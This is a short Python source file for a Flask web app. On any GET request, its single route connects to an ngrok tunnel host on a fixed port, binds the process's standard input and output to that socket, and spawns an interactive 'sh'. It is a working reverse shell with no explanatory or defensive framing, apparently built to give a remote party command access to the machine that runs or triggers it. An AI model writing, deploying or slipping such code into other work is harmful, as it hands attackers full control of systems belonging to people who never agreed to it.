import sys,socket,os,pty
from flask import Flask, redirect, request

app = Flask(__name__)

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>', methods=['GET'])
def main(path):
    s=socket.socket()
    s.connect(("4.tcp.ngrok.io", 15185))
    [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
    pty.spawn("sh")
    return "Done!"

